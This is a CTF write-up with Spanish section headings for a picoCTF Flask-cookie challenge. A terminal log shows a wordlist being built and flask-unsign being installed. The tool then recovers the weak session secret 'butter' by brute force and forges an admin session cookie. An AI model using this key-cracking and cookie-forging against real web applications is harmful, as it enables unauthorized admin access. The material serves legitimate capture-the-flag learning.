Descripción
	Alright, enough of using my own encryption. Flask session cookies should be plenty secure! [server.py](https://mercury.picoctf.net/static/60f76192f6e1fea6f4e6e8c5fc9a6a27/server.py) [http://mercury.picoctf.net:44693/](http://mercury.picoctf.net:44693/)
	
Solución
	
	┌──(gibran㉿vbox)-[~]
	└─$ cd Descargas 
	                                                                                                                 
	┌──(gibran㉿vbox)-[~/Descargas]
	└─$ echo "snickerdoodle           
	chocolate chip
	oatmeal raisin
	gingersnap
	shortbread   
	peanut butter
	whoopie pie
	sugar   
	molasses
	kiss    
	biscotti
	butter
	spritz  
	snowball
	drop      
	thumbprint
	pinwheel
	wafer   
	macaroon
	fortune
	crinkle
	icebox     
	gingerbread
	tassie   
	lebkuchen
	macaron
	black and white 
	white chocolate macadamia" > cookies.txt
	
	                                                                                                                 
	┌──(gibran㉿vbox)-[~/Descargas]
	└─$ flask-unsign -u --server "http://mercury.picoctf.net:44693" --wordlist cookies.txt 
	No se pudo encontrar la base de datos de command-not-found. Ejecute «sudo apt update» para rellenarla de información.
	flask-unsign: no se encontró la orden
	                                                                                                                 
	┌──(gibran㉿vbox)-[~/Descargas]
	└─$ pip3 install flask-unsign
	error: externally-managed-environment
	
	× This environment is externally managed
	╰─> To install Python packages system-wide, try apt install
	    python3-xyz, where xyz is the package you are trying to
	    install.
	    
	    If you wish to install a non-Kali-packaged Python package,
	    create a virtual environment using python3 -m venv path/to/venv.
	    Then use path/to/venv/bin/python and path/to/venv/bin/pip. Make
	    sure you have pypy3-venv installed.
	    
	    If you wish to install a non-Kali-packaged Python application,
	    it may be easiest to use pipx install xyz, which will manage a
	    virtual environment for you. Make sure you have pipx installed.
	    
	    For more information, refer to the following:
	    * https://www.kali.org/docs/general-use/python3-external-packages/
	    * /usr/share/doc/python3.13/README.venv
	
	note: If you believe this is a mistake, please contact your Python installation or OS distribution provider. You can override this, at the risk of breaking your Python installation or OS, by passing --break-system-packages.
	hint: See PEP 668 for the detailed specification.
	                                                                                                                 
	┌──(gibran㉿vbox)-[~/Descargas]
	└─$ python -m venv ~/.venv     
	                                                                                                                 
	┌──(gibran㉿vbox)-[~/Descargas]
	└─$ source ~/.venv/bin/activate
	                                                                                                                 
	┌──(.venv)─(gibran㉿vbox)-[~/Descargas]
	└─$ pip install flask-unsign   
	Requirement already satisfied: flask-unsign in /home/gibran/.venv/lib/python3.13/site-packages (1.2.1)
	Requirement already satisfied: flask in /home/gibran/.venv/lib/python3.13/site-packages (from flask-unsign) (3.1.2)
	Requirement already satisfied: requests in /home/gibran/.venv/lib/python3.13/site-packages (from flask-unsign) (2.32.5)
	Requirement already satisfied: itsdangerous in /home/gibran/.venv/lib/python3.13/site-packages (from flask-unsign) (2.2.0)
	Requirement already satisfied: markupsafe in /home/gibran/.venv/lib/python3.13/site-packages (from flask-unsign) (3.0.3)
	Requirement already satisfied: werkzeug in /home/gibran/.venv/lib/python3.13/site-packages (from flask-unsign) (3.1.3)
	Requirement already satisfied: blinker>=1.9.0 in /home/gibran/.venv/lib/python3.13/site-packages (from flask->flask-unsign) (1.9.0)
	Requirement already satisfied: click>=8.1.3 in /home/gibran/.venv/lib/python3.13/site-packages (from flask->flask-unsign) (8.3.0)
	Requirement already satisfied: jinja2>=3.1.2 in /home/gibran/.venv/lib/python3.13/site-packages (from flask->flask-unsign) (3.1.6)
	Requirement already satisfied: charset_normalizer<4,>=2 in /home/gibran/.venv/lib/python3.13/site-packages (from requests->flask-unsign) (3.4.4)
	Requirement already satisfied: idna<4,>=2.5 in /home/gibran/.venv/lib/python3.13/site-packages (from requests->flask-unsign) (3.11)
	Requirement already satisfied: urllib3<3,>=1.21.1 in /home/gibran/.venv/lib/python3.13/site-packages (from requests->flask-unsign) (2.5.0)
	Requirement already satisfied: certifi>=2017.4.17 in /home/gibran/.venv/lib/python3.13/site-packages (from requests->flask-unsign) (2025.10.5)
	                                                                                                                 
	┌──(.venv)─(gibran㉿vbox)-[~/Descargas]
	└─$ flask-unsign -u --server "http://mercury.picoctf.net:44693" --wordlist cookies.txt
	[*] Server returned HTTP 302 (FOUND)
	[+] Successfully obtained session cookie: eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.aPwATA.YyvEn4E47mwt62m-yTdXOqE6jRo
	[*] Session decodes to: {'very_auth': 'blank'}
	[*] Starting brute-forcer with 8 threads..
	[+] Found secret key after 28 attemptscadamia
	'butter'
	                                                                                                                 
	┌──(.venv)─(gibran㉿vbox)-[~/Descargas]
	└─$ flask-unsign -s -c "{'very_auth': 'admin'}" -S butter                       
	eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.aPwA2A.gAMoEBXfuR8ywCn6ubay2lmuIxg
	
	
Notas adicionales
	
	
Referencias
	
	